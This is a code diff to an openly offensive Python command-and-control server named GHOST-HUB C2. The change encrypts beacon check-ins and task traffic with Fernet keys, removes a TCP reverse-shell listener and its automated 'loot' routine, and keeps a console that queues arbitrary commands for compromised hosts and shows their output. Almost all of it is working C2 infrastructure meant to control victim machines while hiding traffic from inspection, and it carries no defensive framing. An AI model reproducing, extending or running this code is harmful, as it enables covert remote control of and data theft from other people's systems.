@@ -2,8 +2,11 @@ import socket
 import threading
 import asyncio
 import time
+import json
+import os
 import questionary
 from aiohttp import web
+from cryptography.fernet import Fernet
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
@@ -13,18 +16,33 @@ from modules.looter import run_looter
 console = Console()
 
 
-class HttpBeaconHub:
-    """Next-Generation HTTP Beacon Listener"""
+class EncryptedBeaconHub:
+    """Next-Generation AES-Encrypted HTTP C2 Listener"""
 
     def __init__(self, port=8080):
         self.port = port
         self.beacons = {}
         self.tasks = {}
+        self.cipher = None
+        self.load_key()
+
+    def load_key(self):
+        try:
+            with open("logs/c2_aes.key", "r") as f:
+                key = f.read().strip()
+                self.cipher = Fernet(key.encode())
+        except Exception:
+            console.print(
+                "[yellow][!] Warning: No AES key found. Generate an HTTP beacon first![/yellow]")
 
     async def handle_ping(self, request):
+        if not self.cipher:
+            return web.Response(status=403)
         try:
-            data = await request.json()
+            enc_data = await request.text()
+            data = json.loads(self.cipher.decrypt(enc_data.encode()).decode())
             agent_id = data.get('id')
+
             if agent_id not in self.beacons:
                 console.print(
                     f"\n[bold green][+] NEW BEACON ACTIVE: {request.remote} (ID: {agent_id})[/bold green]")
@@ -37,149 +55,68 @@ class HttpBeaconHub:
 
             if agent_id in self.tasks and self.tasks[agent_id]:
                 task = self.tasks[agent_id].pop(0)
-                return web.json_response({"status": "task", "command": task})
+                resp = self.cipher.encrypt(json.dumps(
+                    {"status": "task", "command": task}).encode()).decode()
+                return web.Response(text=resp)
 
-            return web.json_response({"status": "sleep"})
+            resp = self.cipher.encrypt(json.dumps(
+                {"status": "sleep"}).encode()).decode()
+            return web.Response(text=resp)
         except Exception:
-            return web.json_response({"status": "error"})
+            return web.Response(status=500)
 
     async def handle_result(self, request):
+        if not self.cipher:
+            return web.Response(status=403)
         try:
-            data = await request.json()
+            enc_data = await request.text()
+            data = json.loads(self.cipher.decrypt(enc_data.encode()).decode())
             agent_id = data.get('id')
             result = data.get('result')
             console.print(
                 f"\n[bold cyan]Result from Beacon {agent_id}:[/bold cyan]\n{result}\n[bold red]Ghost-Hub[/bold red]> ", end="")
-            return web.json_response({"status": "ok"})
+            return web.Response(text="OK")
         except Exception:
-            return web.json_response({"status": "error"})
+            return web.Response(status=500)
 
     async def start(self):
         app = web.Application()
-        app.router.add_post('/api/v1/ping', self.handle_ping)
-        app.router.add_post('/api/v1/result', self.handle_result)
+        app.router.add_post('/api/v2/ping', self.handle_ping)
+        app.router.add_post('/api/v2/result', self.handle_result)
         runner = web.AppRunner(app)
         await runner.setup()
         site = web.TCPSite(runner, '0.0.0.0', self.port)
         await site.start()
 
 
-class GhostHub:
-    def __init__(self, port=4444):
-        self.port = int(port)
-        self.sessions = {}
-        self.counter = 1
-
-    async def handle_ghost(self, reader, writer):
-        addr = writer.get_extra_info('peername')
-        s_id = self.counter
-        self.sessions[s_id] = {
-            'reader': reader,
-            'writer': writer,
-            'ip': addr[0],
-            'time': time.strftime("%H:%M:%S")
-        }
-        self.counter += 1
-        console.print(
-            f"\n[bold green][+] TCP GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")
-
-    async def interact(self, s_id):
-        if s_id not in self.sessions:
-            return console.print(f"[red][!] Session {s_id} not found.[/red]")
-
-        session = self.sessions[s_id]
-        writer = session['writer']
-        reader = session['reader']
-
-        console.print(
-            Panel(f"Target: {session['ip']}\nCommands: loot, exit", border_style="red"))
-
-        loop = asyncio.get_running_loop()
-
-        while True:
-            # Wrapped in run_in_executor so typing doesn't freeze the HTTP Beacons checking in!
-            cmd = await loop.run_in_executor(None, console.input, f"[bold red]Ghost-{s_id}[/bold red]> ")
-            cmd = cmd.strip()
-
-            if cmd == "back":
-                break
-            if cmd == "terminate":
-                writer.close()
-                await writer.wait_closed()
-                del self.sessions[s_id]
-                break
-
-            if cmd == "loot":
-                console.print(
-                    "[dim][*] Running automated loot sequence...[/dim]")
-                report = await run_looter(reader, writer)
-                console.print(
-                    Panel(report, title="Loot Report", border_style="yellow"))
-                continue
-
-            writer.write((cmd + "\n").encode())
-            await writer.drain()
-
-            try:
-                data = await asyncio.wait_for(reader.read(16384), timeout=5.0)
-                console.print(data.decode('utf-8', errors='ignore'))
-            except asyncio.TimeoutError:
-                console.print("[yellow][!] Response timed out.[/yellow]")
-
-    async def start_server(self):
-        server = await asyncio.start_server(self.handle_ghost, '0.0.0.0', self.port)
-        async with server:
-            await server.serve_forever()
-
-
 async def async_hub_entry():
-    draw_header("GHOST-HUB C2 (Dual Stack)")
+    draw_header("GHOST-HUB C2 (Encrypted Network)")
+    port = await questionary.text("Listen Port (Default 4445 for HTTP):", default="4445", style=Q_STYLE).ask_async()
 
-    # Swapped to .ask_async() to play nice with the event loop
-    port = await questionary.text("Listen Port (TCP & HTTP Beacons):", default="4444", style=Q_STYLE).ask_async()
-
-    tcp_hub = GhostHub(port=port)
-    http_hub = HttpBeaconHub(port=int(port)+1)  # HTTP beacons run on Port + 1
-
-    console.print(f"[*] TCP Shells Listener active on Port {port}")
-    console.print(f"[*] HTTP Beacon Listener active on Port {int(port)+1}\n")
-
-    asyncio.create_task(tcp_hub.start_server())
+    http_hub = EncryptedBeaconHub(port=int(port))
+    console.print(f"[*] AES-Encrypted Beacon Listener active on Port {port}\n")
     asyncio.create_task(http_hub.start())
 
     while True:
-        # Session List Update (Merging TCP and HTTP Beacons)
-        if tcp_hub.sessions or http_hub.beacons:
+        if http_hub.beacons:
             table = Table(title="Active GHOST Sessions", border_style="red")
             table.add_column("ID")
             table.add_column("Type")
             table.add_column("IP / SysInfo")
-            table.add_column("Time / Last Seen")
-
-            for sid, d in tcp_hub.sessions.items():
-                table.add_row(
-                    str(sid), "[blue]TCP Shell[/blue]", d['ip'], d['time'])
+            table.add_column("Last Seen")
 
             for bid, d in http_hub.beacons.items():
                 seen_ago = int(time.time() - d['last_seen'])
-                table.add_row(str(bid), "[magenta]HTTP Beacon[/magenta]",
+                table.add_row(str(bid), "[magenta]Encrypted Beacon[/magenta]",
                               f"{d['ip']} | {d['sysinfo']}", f"{seen_ago}s ago")
-
             console.print(table)
 
-        # Swapped to .ask_async() here as well
-        cmd = await questionary.text("Hub Command (interact <ID>, task <ID> <CMD>, exit):", style=Q_STYLE).ask_async()
+        cmd = await questionary.text("Hub Command (task <ID> <CMD>, exit):", style=Q_STYLE).ask_async()
         if not cmd:
             continue
 
         args = cmd.split(maxsplit=2)
-        if args[0] == "interact":
-            try:
-                await tcp_hub.interact(int(args[1]))
-            except:
-                console.print(
-                    "[red]Invalid ID or Target is an HTTP Beacon (Use 'task' for beacons)[/red]")
-        elif args[0] == "task":
+        if args[0] == "task":
             if len(args) < 3:
                 console.print("[red]Usage: task <Beacon_ID> <command>[/red]")
                 continue
@@ -189,7 +126,7 @@ async def async_hub_entry():
                     http_hub.tasks[bid] = []
                 http_hub.tasks[bid].append(command)
                 console.print(
-                    f"[green][+] Task queued for Beacon {bid}. Waiting for check-in...[/green]")
+                    f"[green][+] Task queued securely for Beacon {bid}.[/green]")
             else:
                 console.print("[red]Invalid Beacon ID[/red]")
         elif args[0] == "exit":
